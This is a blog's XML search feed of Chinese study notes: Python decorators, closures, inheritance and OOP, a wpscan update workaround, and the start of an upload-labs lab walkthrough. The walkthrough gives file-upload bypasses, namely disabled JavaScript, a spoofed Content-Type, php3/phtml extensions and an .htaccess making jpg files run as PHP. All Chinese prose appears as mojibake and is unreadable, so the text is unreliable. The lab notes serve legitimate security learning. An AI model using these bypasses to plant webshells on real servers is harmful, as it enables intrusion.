è°ƒç”¨å®ä¾‹çš„callæ–¹æ³• -> è¿”å› self.funcå‡½æ•°ä½“ # 3. n = test() ï¼Œn() è°ƒç”¨testï¼ˆï¼‰ ç±»ä¸­å¸¸è§çš„å‡ ç§è£…é¥°å™¨class Test(): aa = 123 def __init__(self,name): self.__name = name @property # æŠŠæ–¹æ³•å˜æˆå±æ€§ def get_name(self): print( self.__name) return self.__name @get_name.setter # å¯ä»¥è®©getæ–¹æ³•ï¼Œå˜æˆsetæ–¹æ³• def get_name(self,name): self.__name = name @property # æŠŠæ–¹æ³•å˜æˆå±æ€§ def po(self): print('asdfasdfasdfasdaf') @staticmethod def test(): print('staticmethod func') @classmethod def show(cls): print(cls.aa) # å¯ä»¥è®¿é—®ç±»å±æ€§ print('classmethod func ') t = Test('jianeng') t.show() # @property # t.get_name = 4 # get_name.setter æ²¡æœ‰å†™çš„æ—¶å€™ï¼Œ = 4 ä¼šæŠ¥é”™ # t.get_name # t.po # @staticmethod #æ²¡æœ‰self t.test() # æ²¡æœ‰self ï¼Œå®ä¾‹ä¸èƒ½è°ƒç”¨ã€‚ Test.test() # ç±»åå¯ä»¥ç›´æ¥è°ƒç”¨ ### @classmethod #ç±»æ–¹æ³•, ä¸€èˆ¬æ˜¯ç”¨æ¥åšå°è£… classåå­—å·²ç»ä¼ è¿›å»äº† Test.show() #æœ‰selfï¼Œ ç±»åä¸èƒ½ç›´æ¥è°ƒç”¨ t.show() ##é™æ€æ–¹æ³•è£…é¥°å™¨ï¼š staticmethod ç±»è°ƒç”¨ä¸å®ä¾‹è°ƒç”¨æ— å·®åˆ«ï¼Œ ä¹Ÿä¸éœ€è¦selfå‚æ•°ï¼Œç±»ä¼¼äºæ™®é€šå‡½æ•° ä¸éœ€å®ä¾‹åŒ–å°±å¯ä»¥è°ƒç”¨,ç›´æ¥ç”¨ç±»åè°ƒç”¨ ï¼ˆä¸å®ä¾‹è§£ç»‘ï¼‰ï¼Œ ä¸èƒ½è®¿é—®å…¶ä»–çš„ç±»å±æ€§ä¸æ–¹æ³•ï¼ˆç›¸å½“äºç±»çš„æ–¹æ³•ï¼‰ ##ç±»æ–¹æ³•è£…é¥°å™¨ï¼š classmethod selfå‚æ•°è¢«æ¢æˆclså‚æ•°ï¼Œ è‡ªåŠ¨ä¼ å…¥å¯¹åº”çš„ç±» å¯ä»¥è®¿é—®ç±»å±æ€§ä¸å…¶ä»–ç±»æ–¹æ³• document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>è£…é¥°å™¨</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pythonåŸºç¡€-é—­åŒ…]]></title>
    <url>%2Fposts%2F1c7bab7f%2F</url>
    <content type="text"><![CDATA[# é—­åŒ…: ä¸€ä¸ªå‡½æ•°é‡Œé¢åµŒå¥—ä¸€ä¸ªå‡½æ•°,è°ƒç”¨å¤–å±‚å‡½æ•°è¿”å›é‡Œå±‚å‡½æ•°æœ¬èº« #1. def fx(x): x+=1 def fy(y): return x*y return fy #ä¸è¦åŠ æ‹¬å· f=fx(5) #æ‹¿åˆ°fyçš„å‡½æ•°ä½“ n = f(5) #fy() print(n) #2.ä¼ è¿›å»çš„å‚æ•°ä¸ºå‡½æ•°ä½“ def f1(func): print('f1 runing') def f2(y): print('f2 running') return func(y) +1 return f2 def gun(m): print('gun runing') return m*m temp = f1(gun) # è¿”å›f2å‡½æ•°ä½“ # f1 runing -> f2 ->temp n= temp( 5) # f2( 5) -> ' f2 running ' -> return func(y) +1 # func(y) === gun(m) -> gun runing -> 5*5 # return 25 +1 -> 26 print(n) document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>é—­åŒ…</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pythoné¢å‘å¯¹è±¡-ç»§æ‰¿å°å°ä¾‹å­]]></title>
    <url>%2Fposts%2Fe211efc6%2F</url>
    <content type="text"><![CDATA[ç”¨ä¹‹å‰å­¦ä¹ ç¬”è®°çš„å°ä¾‹å­æ¥å¤ä¹ ä¸€ä¸‹ ############################ç»§æ‰¿ #çˆ¶ç±»é‡Œé¢æœ‰çš„,å­ç±»é‡Œé¢å†å†™ä¸€æ¬¡. å«åšé‡å†™ ,åªä¼šç”¨å­ç±»çš„äº†,çˆ¶ç±»çš„å°±å±è”½äº† #ç»§æ‰¿æ˜¯é€šè¿‡æŸ¥æ‰¾æ¥æ‰¾çš„, ä¸æ˜¯å˜é‡ç©ºé—´çš„å¤åˆ¶, è¿˜æ˜¯ç‹¬ç«‹çš„å˜é‡ç©ºé—´ # å¤šç»§æ‰¿ æ—¢ä¸æ˜¯å¹¿åº¦ä¹Ÿä¸æ˜¯æ·±åº¦æœç´¢ . mro() æ–¹æ³•,æ˜¯åœ¨ç±»é‡Œé¢çš„,ä»–ä¼šè‡ªå·±è®¡ç®—å‡ºæœç´¢é¡ºåº ä¾‹å¦‚: print(Magician.mro())æˆ–print(Magician.__mro__) æˆ–è€… print(s.__class__.mro()) # [&lt;class '__main__.Magician'>, &lt;class '__main__.Role'>, &lt;class 'object'>] # super è‡ªå·±æ‰¾çˆ¶ç±», å¦‚æœçˆ¶ç±»æ”¹å˜,ä¹Ÿä¸éœ€è¦ä¿®æ”¹,å“ªæ€•çˆ¶ç±»è¢«æ›´æ¢ï¼Œä¹Ÿä¸ç”¨æ‹…å¿ƒäº†ï¼ superä¸éœ€è¦å†ä¼ self ,superæ˜¯é€šè¿‡mroæŸ¥æ‰¾çš„ #__bases__ç‰¹æ®Šå±æ€§ print(Role.__bases__) æ‰“å°å‡ºæ¥æ˜¯ä¸€ä¸ªå…ƒç»„ (&lt;class 'object'>,) #å®ä¾‹+() è‡ªåŠ¨è°ƒç”¨__call__æ–¹æ³• class Role: def __init__(self,name,level,blood): # åœ¨å®ä¾‹åŒ–ä¹‹åè‡ªåŠ¨è¢«è°ƒç”¨,ç”¨æ¥è¿›è¡Œåˆå§‹åŒ– self.name = name self.level = level self.blood = blood def __repr__(self): return "{cls}:{name},{level},{blood}".format(cls=self.__class__.__name__, name=self.name, level=self.level, blood=self.blood ) def figth(self): raise NotImplementedError('å¿…é¡»åœ¨å­ç±»ä¸­å®ç°è¯¥è¡Œä¸º') class SwordsMan(Role): #ç»§æ‰¿äº†Roleç±» def __init__(self,name,level,blood,attack_power): #é‡å†™äº†__init__ #Role.__init__(self,name,level,blood) super().__init__(name, level, blood) #ä¸åœ¨æ˜ç¡®æŒ‡å®šç±»å self.attack_power = attack_power def fight(self): print('ç‰©ç†æ”»å‡»') class Magician(Role): #ç»§æ‰¿è‡ªRole def __init__(self,name,level,blood,magical_power): #é‡å†™äº†__init__ #Role.__init__(self,name,level,blood) super().__init__(name, level, blood) # ä¸åœ¨æ˜ç¡®æŒ‡å®šç±»å self.magical_power = magical_power def fight(self): print('é­”æ³•æ”»å‡»') def cure(self): print('æ²»ç–—') ## é¸­å­ç±»å‹ #å±•ç¤ºå‡ºæ”»å‡»çš„æ•ˆæœ(è¿™ä»¶äº‹,ä¸å±äºä»»ä½•ä¸€ä¸ªè§’è‰²) #å†™å‡ºä¸€ä¸ªå‡½æ•° def draw_fight(role): # é¸­å­ç±»å‹ä½“ç°å‡ºæ¥æ˜¯,ä¸€ä¸ªå‡½æ•°,æ‰€å…³å¿ƒçš„ä¸æ˜¯ç±»å‹,è€Œæ˜¯è¡Œä¸º print('role', end='') role.fight() # å…¶å®å¹¶ä¸å…³å¿ƒ,roleæ˜¯ä¸æ˜¯ä¸€ä¸ªroleå®ä¾‹ class GirlFriend: #è™½ç„¶æ²¡æœ‰ç»§æ‰¿Roleç±»,ä¾ç„¶å¯ä»¥ç”¨é¸­å­ç±»å‹ def __init__(self,name): self.name = name def fight(self): print('æ‹”ç”µæºæ”»å‡»') g = GirlFriend('xxx') draw_fight(g) #æ‰“å°å‡ºroleæ‹”ç”µæºæ”»å‡» s= SwordsMan('xps',18,3000,150) #å®ä¾‹åŒ– m = Magician('ps',18,1400,6660) draw_fight(s) #æ‰“å°å‡º roleç‰©ç†æ”»å‡» draw_fight(m) #æ‰“å°å‡º roleé­”æ³•æ”»å‡» print(s) print(m.__repr__()) print('***********************************************************') # ç»§æ‰¿æ˜¯é€šè¿‡æŸ¥æ‰¾æ¥æ‰¾çš„, ä¸æ˜¯å˜é‡ç©ºé—´çš„å¤åˆ¶, è€Œæ˜¯ç‹¬ç«‹çš„å˜é‡ç©ºé—´ class BaseClass: attribute = 1 def method(self): pass class DerivedClass: # ç®€å•ç»§æ‰¿,æ²¡æœ‰ä»»ä½•çš„å°è£…ä¸é‡å†™ pass print(DerivedClass.__dict__) # DerivedClassä¸­æ²¡æœ‰ attribute ä¸ method print(BaseClass.__dict__) # BaseClassä¸­æœ‰ print(Magician.__mro__) print(s.__class__.mro()) document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>ç»§æ‰¿</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pythoné¢å‘å¯¹è±¡å°ä¾‹å­]]></title>
    <url>%2Fposts%2F4cceafcb%2F</url>
    <content type="text"><![CDATA[ç”¨ä¸€ä¸ªé“¶è¡Œå­˜æ¬¾å–æ¬¾çš„ä¾‹å­æ¥å›å¿†ä¸€ä¸‹é¢å‘å¯¹è±¡æœ€åŸºç¡€çš„éƒ¨åˆ† class Account: all_count={} #ç±»å±æ€§ def __init__(self, name, number, balance): # åˆå§‹åŒ–è´¦æˆ·çš„'å®ä¾‹æ–¹æ³•',è§åçŸ¥æ„ self.name = name self.number = number # å®ä¾‹çš„å˜é‡å±æ€§ self.balance = balance self.all_count[self.number] = self # # def __del__(self): #å½“å®ä¾‹å¯¹è±¡è¢«é”€æ¯çš„æ—¶å€™,å½“å˜é‡çš„æŒ‡å‘ä¸º0çš„æ—¶å€™ è‡ªåŠ¨è§¦å‘ # print(self.name,'è¢«é”€æ¯äº†') def deposit(self, amount): # å­˜æ¬¾ if amount &lt;= 0: print('å­˜æ¬¾é‡‘é¢ä¸å¾—ä¸ºè´Ÿ') else: self.balance += amount def withdraw(self, amount): # å–æ¬¾ if amount > self.balance: print('ä½™é¢ä¸è¶³') else: self.balance -= amount def describe(self): # æŸ¥è¯¢è´¦æˆ·è¯¦æƒ… return "Account(å§“å:{name},è´¦æˆ·:{number},ä½™é¢:{balance})".format(name=self.name, number=self.number, balance=self.balance) def close(self): self.all_count.pop(self.number) a=Account('xps','6217',10000) v = getattr(a,'nme','000') # b = a # del a print(v) # a.deposit(5000) # a.withdraw(2500) # print(a.describe()) # # print(a.__dict__) # print(__name__) ############################################ ç¬”è®° #######################################3 #__init__() åœ¨å®ä¾‹åŒ–ä¹‹åè‡ªåŠ¨è¢«è°ƒç”¨,ç”¨æ¥è¿›è¡Œåˆå§‹åŒ– #__del__() åˆ é™¤å˜é‡çš„æŒ‡å‘,ä¸æ˜¯ç›´æ¥å»åˆ é™¤è¿™ä¸ªå¯¹è±¡ ä¾‹å¦‚:a=[1,2,3] b=a del a aå˜é‡æ²¡äº†,ä½†æ˜¯bè¿˜å­˜åœ¨ #ç¨‹åºæ‰§è¡Œå®Œä¹‹åå˜é‡çš„å†…å­˜è‡ªåŠ¨é‡Šæ”¾.è‡ªåŠ¨è§¦å‘ __del__ #__str__() #str ä¼šè‡ªåŠ¨è§¦å‘ å¯¹ç”¨æˆ·å‹å¥½ åé¢å¯ä»¥ç›´æ¥ print(a) æ¥è¾“å‡ºstrçš„å€¼,å¦‚æœæ²¡æœ‰å®šä¹‰a,åˆ™è¾“å‡ºreprçš„å€¼ #__repr__() reprä¼šè‡ªåŠ¨è§¦å‘ å¯¹å¼€å‘è€…å‹å¥½ åœ¨æ§åˆ¶å°shell ç›´æ¥ a è¾“å‡ºreprçš„å€¼ ,å¦‚æœrepræ²¡æœ‰å®šä¹‰,åˆ™ä¸ä¼šæ‰¾str #getattr() getattr(i,'name','æ²¡æœ‰') ç›¸å½“äºè½¬æ¢æˆå¯¹è±¡çš„è®¿é—® obj.name è·å–,,å’Œå­—å…¸é‡Œé¢çš„get()æ–¹æ³•ç±»ä¼¼,æ‰¾ä¸åˆ°è¿”å›'æ²¡æœ‰' 'name'è¿™é‡Œæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸² #hasattr() hasattr(i,'xxx') è¿”å›å¸ƒå°”å€¼ (è¿˜å¯ä»¥é¿å…å› ä¸ºå±æ€§æ²¡æœ‰è€Œäº§ç”ŸæŠ¥é”™) 'xxx'ä¹Ÿæ˜¯å­—ç¬¦ä¸² hasattr è¿˜å¯ä»¥é¿å…ï¼Œå› ä¸ºå±æ€§æ²¡æœ‰ï¼Œè€Œå¯¼è‡´çš„æŠ¥é”™ #setattr() setattr(i,'name','vvv'') è‡ªåŠ¨è½¬æ¢æˆi.name = 'vvv' 'name'è¿™é‡Œæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸² #delattr() delattr(i,'name') åˆ é™¤ 'name'è¿™é‡Œæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸² è½¬åŒ–æˆdel i.name #__class__ å¯ä»¥å¾—åˆ°ä¸€ä¸ªç±»å®ä¾‹æ‰€å±çš„ç±»å¯¹è±¡,print(a.__class__) &lt;class '__main__.Account'> ä¸æ˜¯ç±»å #__doc__ æ³¨é‡Šæ–‡æ¡£å†™äº†ä¹‹å,å¯ä»¥helpå‡ºæ¥ å¦‚:print(help(Account)) # æ³¨é‡Šå­˜å‚¨åœ¨äº†__doc__é‡Œ å¦‚: print(Account.__doc__)å¯ä»¥æ‰“å°å…¶æ–‡æ¡£æ³¨é‡Š #__dict__ ä¸€ä¸ªå­˜å‚¨äº†å¯¹è±¡å±æ€§çš„å­—å…¸ æŠŠè¯¥å˜é‡ç©ºé—´çš„æ‰“å°å‡ºæ¥ # ä¾‹:print(a.__dict__) >>{'balance': 12500, 'name': 'xps', 'number': '6217'} #ç±»ä¹Ÿå¯ä»¥ print(Account.__dict__) #__name__ def dance(): pass print(dance.__name__) #å¯ä»¥æŸ¥çœ‹è¯¥å‡½æ•°çš„åå­— class C: pass print(C.__name__) #å¯ä»¥æŸ¥çœ‹è¯¥ç±»çš„åå­— #ç±»å æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸² #print è¾“å‡ºçš„æ˜¯ä½ ç»™ä»–çš„ä¸œè¥¿å¾— __str__ #shell é‡Œé¢ è¾“å‡ºçš„æ˜¯ ä½ ç»™ä»–çš„ä¸œè¥¿çš„ __repr__ #self æ˜¯å®ä¾‹æœ¬èº« # print è¾“å‡ºçš„str ä½†æ˜¯å¦‚æœè¾“å‡ºä¸€ä¸ªæ•°æ®ç»“æ„(é›†åˆå…ƒç»„å­—å…¸åˆ—è¡¨)çš„æ•°æ®,é‡Œé¢çš„æ•°æ®,ä¼šä»¥reprå±•ç¤º ######################################################################################## if __name__ == '__main__': pass #print(str(__name__)) __name__ #import çš„æ—¶å€™,ä¼šæŠŠé‚£ä¸ªæ–‡ä»¶æ‰§è¡Œä¸€é ###å¦‚æœä½œä¸ºä¸€ä¸ªæ¨¡å—è¢«å¯¼å…¥çš„è¯,å°±ä¸ä¼šè°ƒç”¨__name__ä»¥ä¸‹çš„ä¸œè¥¿ # print(__name__) ç»“æœä¸º __main__ #######################################################é—­åŒ…###########################33 class A: def __del__(self): print('è¢«é”€æ¯0') def outer(): # a=A() #a æ˜¯åœ¨å‡½æ•°è°ƒç”¨æ—¶å€™å®ä¾‹åŒ–çš„ def inner(): #inner ä¹Ÿæ˜¯åœ¨outeré‡Œé¢å®šä¹‰çš„,åœ¨outerç»“æŸçš„æ—¶å€™innerä¹Ÿè¢«é”€æ¯ print(a) return inner x = outer() #ç”¨ä¸€ä¸ªå˜é‡å»æ¥å—,å°±ä¸ä¼šæ‰“å°å‡ºæ¥,innerè·å¾—ä¸€ä¸ªä¸´æ—¶æŒ‡å‘ del x #é”€æ¯å‡½æ•°inner #1.æ„é€ å±€éƒ¨çš„å…¨å±€å˜é‡ #2.åœ¨æ²¡æœ‰ç±»çš„æƒ…å†µä¸‹,å°è£…å˜é‡ input() ######ç§æœ‰åŒ–,ä¿æŠ¤ä½œç”¨,ç±»çš„å¤–é¢è®¿é—®ä¸åˆ° _eye=2 # protect éšè— ä½†æ˜¯å¯print(dog._eye)è®¿é—®.ä¿®æ”¹ __leg=4 # å½»åº•ä¿æŠ¤. ä¸‡ä¸€è®¿é—®çš„è¯,å¯ä»¥ä»¥ä¸‹åœ¨å¤–é¢è®¿é—®(å…ˆå®šä¹‰ä¸€ä¸ªæ–¹æ³•): def getLeg(self): #è·å–ç§æœ‰å±æ€§ return self.__leg leg = dog.getLeg() print(leg) #å¯é€šè¿‡æ­¤æ–¹æ³•åœ¨ç±»å¤–é¢æŸ¥çœ‹ ###å¦‚æœæ˜¯ä¿®æ”¹ç§æœ‰å±æ€§çš„è¯: def setLeg(self,leg): #è®¾ç½® self.__leg = leg dog.setLeg(55) #ä¿®æ”¹ç§æœ‰å±æ€§ print(dog.getLeg()) #ç”¨get æ–¹æ³•æ¥æŸ¥çœ‹ä¸€ä¸‹ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>é¢å‘å¯¹è±¡</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[wpscanæ›´æ–°è¶…æ—¶æŠ¥é”™]]></title>
    <url>%2Fposts%2F5366e554%2F</url>
    <content type="text"><![CDATA[https://blog.csdn.net/zhang644720213/article/details/92849717 å‚è€ƒè‡ªï¼šhttps://blog.csdn.net/zhang644720213/article/details/92849717 å…ˆæ›´æ–°ä¸€ä¸‹ç³»ç»Ÿçš„ç´¢å¼•updatedb æŸ¥çœ‹æ–‡ä»¶dpkg -L wpscan ä¸‹è½½éœ€è¦çš„åŒ…ï¼ˆæ„Ÿè°¢å¤§ä½¬æä¾›ï¼‰:wget https://files.cnblogs.com/files/despotic/wp.zip æ”¾åˆ°æœ¬åœ°apacheçš„ç›®å½•ä¸‹ï¼šmv wp.zip /var/www/html/wpscan/ è§£å‹ï¼šunzip wp.zip é‡å¯apache/etc/init.d/apache2 restart ç¼–è¾‘é…ç½®æ–‡ä»¶ï¼švim /var/lib/gems/2.5.0/gems/wpscan-3.5.4/lib/wpscan/db/updater.rb æ‰¾åˆ°ï¼šdef remote_file_urlè¿™ä¸ªå‡½æ•°ï¼Œ ä¸‹é¢çš„æœåŠ¡å™¨åœ°å€æ”¹ä¸ºæœ¬åœ°çš„ç›®å½•http://127.0.0.1/wpsaca/#{filename} å†è¿è¡Œwpscan --upgradeå°±å¯ä»¥äº† document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>WPscan</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[upload-labsé€šå…³è®°å½•]]></title>
    <url>%2Fposts%2F3890b03c%2F</url>
    <content type="text"><![CDATA[æœ¬æ–‡ä¸»è¦è®°å½•ä¸€ä¸‹upload-labsæœ€æ–°21å…³å¡çš„è¿‡ç¨‹ï¼Œä½œä¸ºè‡ªå·±çš„ä¸€ä¸ªç¬”è®°ã€‚ é¶åœºåœ°å€ï¼šhttps://github.com/c0ny1/upload-labs/ psï¼š - ä¸ºäº†å¿«é€ŸéªŒè¯æ•ˆæœï¼Œæ­¤å¤„ä¸Šä¼ çš„webshellä»£ç ä¸º&lt;php? phpinfo(); ?&gt; - è§£é¢˜æ€è·¯äº”èŠ±å…«é—¨ï¼Œæˆ‘è¿™é‡Œæƒ³èµ·äº†å•¥å°±ç”¨å•¥ã€‚ - å› ä¸ºæ¯”è¾ƒèœï¼Œæ‰€ä»¥åšé¢˜ç›´æ¥çœ‹ä»£ç äº†å°±(è°æ–™æœ‰çš„é¢˜ç›®çœ‹äº†ä»£ç éƒ½çœ‹ä¸æ‡‚)ï¼Œå“ˆå“ˆå“ˆã€‚ ç›¸å…³å‡½æ•°trim() å»é™¤ç©ºæ ¼ strrchr()æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­`æœ€åä¸€æ¬¡`å‡ºç°çš„ä½ç½®ï¼Œå¹¶è¿”å›ä»è¯¥ä½ç½®åˆ°å­—ç¬¦ä¸²ç»“å°¾çš„æ‰€æœ‰å­—ç¬¦ã€‚ strrchr("è¢«æŸ¥æ‰¾çš„å­—ç¬¦ä¸²", "å‡ºç°çš„å­—ç¬¦ä¸²") strstr() - æŸ¥æ‰¾å­—ç¬¦ä¸²çš„é¦–æ¬¡å‡ºç° strrpos() - è®¡ç®—æŒ‡å®šå­—ç¬¦ä¸²åœ¨ç›®æ ‡å­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½® str_ireplace('è¦æ›¿æ¢çš„å¯¹è±¡','æ›¿æ¢ä¸º','å­—ç¬¦ä¸²') deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ ::$DATA ---&gt; winä¸Šï¼Œä¼šæŠŠ`::$DATA`ä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†ï¼Œä¸ä¼šæ£€æµ‹åç¼€åï¼Œè€Œä¸”ä¿æŒ`::$DATA`ä¹‹å‰çš„æ–‡ä»¶åï¼ˆç›®çš„æ˜¯ä¸æ£€æŸ¥åç¼€åï¼‰ pathinfo(path,options)è¿”å›ä¸€ä¸ªå…³è”æ•°ç»„åŒ…å«æœ‰ path çš„ä¿¡æ¯ã€‚ åŒ…æ‹¬ä»¥ä¸‹çš„æ•°ç»„å…ƒç´ ï¼š [dirname] [basename] [extension] ç¬¬äºŒä¸ªå‚æ•°å¯èƒ½çš„å€¼ï¼š PATHINFO_DIRNAME - åªè¿”å› dirname PATHINFO_BASENAME - åªè¿”å› basename PATHINFO_EXTENSION - åªè¿”å› extension æ³¨é‡Šï¼šå¦‚æœä¸æ˜¯è¦æ±‚å–å¾—æ‰€æœ‰å•å…ƒï¼Œåˆ™ pathinfo() å‡½æ•°è¿”å›å­—ç¬¦ä¸²ã€‚ intval() å‡½æ•°ç”¨äºè·å–å˜é‡çš„æ•´æ•°å€¼ã€‚ @uppack `rename()` å‡½æ•° ï¼šé‡å‘½åæ–‡ä»¶æˆ–ç›®å½•ã€‚å¦‚æœæˆåŠŸï¼Œè¯¥å‡½æ•°è¿”å› TRUEã€‚å¦‚æœå¤±è´¥ï¼Œåˆ™è¿”å› FALSEã€‚rename(oldname,newname,context) Pass-01 jséªŒè¯ ç‚¹å‡»ä¸Šä¼ æ–‡ä»¶ä¹‹åï¼Œburpæ²¡æœ‰æ‹¦æˆªåˆ°æ•°æ®åŒ…ï¼Œå¹¶ä¸”éªŒè¯ååº”é€Ÿåº¦å¿« F12æŸ¥çœ‹ä»£ç åç¡®è®¤ ç»•è¿‡F1: ç¦ç”¨jsï¼Œç›´æ¥ä¸Šä¼ php æˆåŠŸï¼š F2ï¼š åœ¨æœ¬åœ°åˆ›å»ºhtmlï¼Œactionä¸ºæœåŠ¡å™¨è¯·æ±‚åœ°å€ï¼Œï¼ˆå»æ‰ç›¸åº”jséƒ¨åˆ†ï¼‰ F3: å…ˆæŠŠshellæ”¹ä¸ºå…è®¸çš„ç±»å‹,å†bupä¸­å†æ”¹å›æ¥ æ•ˆæœéƒ½æ˜¯ä¸€æ ·çš„ Pass-02 æœåŠ¡ç«¯éªŒè¯ â€“ æ–‡ä»¶MIMEç±»å‹ åªæ£€æµ‹æ–‡ä»¶è‡ªå¸¦çš„ç±»å‹ ç»•è¿‡ï¼šburpä¿®æ”¹æ•°æ®åŒ…ä¸­ä¿®æ”¹MIMEç±»å‹ï¼ˆContent-Typeï¼‰ä¸ºå…è®¸çš„ç±»å‹ Pass03-Pass10: é»‘åå•æ ¡éªŒPass-03 æœåŠ¡ç«¯éªŒè¯(é»‘åå•æ–¹å¼) â€“ å¤šç§æ ¼å¼åç¼€è§£æ å¯¹ä¸Šä¼ çš„æ–‡ä»¶å…ˆè¿‡æ»¤ï¼Œååˆ¤æ–­æ–‡ä»¶åç¼€ï¼Œå†éšæœºå‘½å æ¯”å¦‚ï¼š a.php å…ˆåˆ æ‰æ–‡ä»¶åå‰åçš„ç©ºæ ¼ åˆ é™¤æœ«å°¾çš„ç‚¹ï¼š a.php strrchrä¹‹åï¼š .php è½¬æ¢ä¸ºå°å†™ï¼š .php å»é™¤å­—ç¬¦ä¸²::$DATA å†æ”¶å°¾å»ç©ºæ ¼ æœ€ååŠ ä¸Šæ—¥æœŸé‡å‘½å ç»•è¿‡ å‰æ: httpd-confæ–‡ä»¶ä¸­AddType application/x-httpd-php æ²¡æœ‰è¢«æ³¨é‡Šï¼Œè€Œä¸”æœ‰è§„å®šç±»å‹çš„æ–‡ä»¶ å¯¹ phtmlï¼Œphp3ï¼Œphp4ï¼Œphp5ï¼Œphtï¼Œhtaccessæ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œé‚£ä¹ˆåˆ©ç”¨è¿™ä¸¤ç§æ–¹æ³•è¿›è¡Œç»•è¿‡ã€‚ è¡¥å……: asp: asa, cer, cdx ç­‰ jsp: jspx, jspf aspx: ashx,asmx,ascx å‡†å¤‡å·¥ä½œï¼š ä¿®æ”¹httpd-confé…ç½®æ–‡ä»¶,è¿™é‡Œå¯ä»¥æŠŠphp3ç­‰æƒ³è¦çš„æ–‡ä»¶åç¼€åŠ ä¸Šï¼Œå†æŠŠæ³¨é‡Šç¬¦#å»æ‰ æ­¤ç±»çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œæ–‡ä»¶åå­—æ»¡è¶³å³å¯åœ¨apacheå½“åšphpè§£æã€‚æ¯”å¦‚ä»¥ä¸‹æ ¼å¼çš„æ–‡ä»¶ï¼š php3ï¼Œphp4, php5, phtmlï¼Œphps ä¿®æ”¹ä¸ºï¼š AddType application/x-httpd-php .php .phtml .php3 .php4 .php5 .phps F1: ä¿®æ”¹åç¼€å burpæ‹¦æˆªæ•°æ®åŒ…ï¼Œä¿®æ”¹filenameä¸ºphp3,ä¸Šä¼ æˆåŠŸ å³é”®å›¾ç‰‡æŸ¥çœ‹åœ°å€, ä»è¿™é‡Œå¯ä»¥å¾—çŸ¥ä¸Šä¼ çš„æ–‡ä»¶è¢«é‡å‘½åäº†, æ‰“å¼€å›¾ç‰‡åœ°å€ï¼ŒOK F2: ä¸Šä¼ å›¾ç‰‡é©¬ ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œç„¶ååˆ©ç”¨BPæ‹¦æˆªï¼Œå°†åç¼€å æ”¹ä¸ºphtml,php3,php4,php5,pht â€‹ â€‹ Pass-04 æœåŠ¡ç«¯ï¼ˆphp5ä¹‹ç±»çš„ä¹Ÿè¿›è¡Œäº†è¿‡æ»¤ï¼‰ ä½†æ˜¯æ²¡æœ‰è¿‡æ»¤.htaccessï¼Œå¯ä»¥è€ƒè™‘é‡å†™æ–‡ä»¶è§£æè§„åˆ™ç»•è¿‡ info.php.jpg. ç»•è¿‡ å‰æ: apacheæ­å»ºï¼Œ æ²¡æœ‰å¯¹ä¸Šä¼ æ–‡ä»¶é‡å‘½å .htaccessæ–‡ä»¶ 1.å…ˆä¸Šä¼ ä¸€ä¸ª.htaccessæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š &lt;FilesMatch "jpg"> SetHandler application/x-httpd-php &lt;/FilesMatch> 2.ç„¶åå†ä¸Šä¼ ä¸€ä¸ªinfo.php, burpæ‹¦æˆªæ•°æ®åŒ…ä¿®æ”¹filenameä¸ºinfo.jpg / æˆ–è€…ç›´æ¥ä¸Šå›¾ç‰‡é©¬ï¼Œ urlè®¿é—®å›¾ç‰‡è·¯å¾„ï¼Œæ­£å¸¸è§£æ Pass-05 è¿.htaccesséƒ½æ”¾é»‘åå•äº† ç¼ºé™·ï¼š strrchrå‡½æ•°ï¼š 